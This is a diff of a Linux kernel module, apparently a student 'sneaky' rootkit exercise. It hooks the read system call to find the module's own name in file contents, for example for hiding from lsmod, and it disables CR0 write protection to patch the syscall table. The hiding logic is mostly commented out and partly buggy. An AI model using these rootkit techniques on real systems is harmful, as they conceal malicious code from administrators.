@@ -89,28 +89,30 @@ asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
   //printk(KERN_INFO "Read: Very, very Sneaky!\n");
   int nread= original_call_read(fd,buf,count);
 
-  char* pcBuf=(char*) buf; 
+  // char* pcBuf=(char*) buf; 
 
   const char* sneakyBuff="sneaky_mod"; 
-  char* pch = strstr (buf,sneakyBuff);
+  char* pch = strstr ((char*)buf,sneakyBuff);
 
 
   if (pch) // contains sneaky_mod
   {
-    printk(KERN_INFO "Performing read replacement!\n");
+    //printk(KERN_INFO "Performing read replacement!\n");
     
-    // look for end of current line:
-    //char* EOL = strstr (pch,'\n');
+  //   // look for end of current line:
 
-    //if (EOL)
-    //{
-      //printk(KERN_INFO "Found EOL. %p , %p ,%p\n",(void*)buf,(void*)pch,(void*)EOL);
+    char EOL='\n';
+    char* EOL_location = strstr (pch,&EOL);
+
+    if (EOL_location)
+    {
+      printk(KERN_INFO "Located EOL -    %p , %p ,%p\n",(void*)buf,(void*)pch,(void*)EOL_location);
       //memcpy(pch,EOL+1,nread-(EOL-pch+1)); 
-    //}
+    }
 
 
-    //strcpy (pch,"~~~~~~");
-  }
+  //   //strcpy (pch,"~~~~~~");
+   }
 
   return nread; 
 }
@@ -177,9 +179,9 @@ static int initialize_sneaky_module(void)
   struct page *page_ptr;
 
   //See /var/log/syslog for kernel print output
-  printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_INFO "Sneaky module being loaded!!!!.\n");
 
-  printk(KERN_INFO "sneaky_process_pid is an integer: %d\n", sneaky_process_pid);
+  printk(KERN_INFO "sneaky_process_pid is an integer!!!!!: %d\n", sneaky_process_pid);
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
